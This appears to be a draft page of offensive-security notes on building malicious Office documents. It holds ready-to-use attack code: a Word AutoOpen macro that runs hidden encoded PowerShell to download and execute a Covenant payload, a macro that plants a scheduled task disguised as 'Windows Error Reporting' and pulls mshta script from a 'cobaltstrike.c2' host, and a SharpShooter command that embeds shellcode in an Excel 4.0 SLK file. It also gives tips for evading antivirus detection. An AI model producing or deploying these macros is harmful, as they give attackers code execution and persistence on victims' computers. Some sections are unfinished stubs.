---
title: "Malicious Documents"
date: 2020-07-16T13:41:37+02:00
draft: true
---
reference: https://blog.f-secure.com/dechaining-macros-and-evading-edr/

#### Word Macro's
##### Basic Office Macro using PowerShell
The example below shows a basic Microsoft Office Word macro, downloading and executing a covenant payload.
```vb
Sub AutoOpen()    
        Call Shell("powershell -Sta -Nop -Window Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgA5AC8AZgBpAGcAYQAnACkA")
End Sub
```

##### Creating a sheduled task using a Macro
The example code below shows the VB code that creates a sheduled task, which in turn downloads and executes a malicious SCT file using MSHTA. 
```vb
Sub Auto_open()
Call Shell("schtasks /create /sc MINUTE /tn ""Windows Error Reporting"" /tr ""mshta.exe javascript:a=GetObject('script:http://cobaltstrike.c2/updates/microsoftftp.jpg').Exec();close();"" /mo 15 /F")
End Sub
```
***

#### Malicious HTA ToDo
Find good (working) examples

#### Excel 4.0 Macro
Note: As of 09-22-2020 Microsoft has integrated Excel 4.0 (XLM) into the ASMI interface. (https://techcommunity.microsoft.com/t5/office-365-blog/keeping-users-safe-and-productive-with-microsoft-365-apps-for/ba-p/1665728)
Excel 4.0 Marcos are a depricated feature within Excel. Even though functionality (and documentation) might be limited, this is still a very powerfull way of executing code. Because this form of Macro's is so old, mant modern AV solutions have trouble tracking and detecting these macros. A big advantage of these Macros are the fact that it doesn't spawn a (child) process, which defeats parent/child analysis.
The SharShooter framework from MDSec has the ability to generate slk files (Excel files with 4.0 Macros), while embedding your own shellcode. The example below shows the command needed to generate a SLK file with a msfvenom generated shellcode file.
```
python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test
```
You might want to put some effor into making the Excel file look nice :)




#### VBA Stomping (Work Out)
reference: https://medium.com/walmartlabs/vba-stomping-advanced-maldoc-techniques-612c484ab278



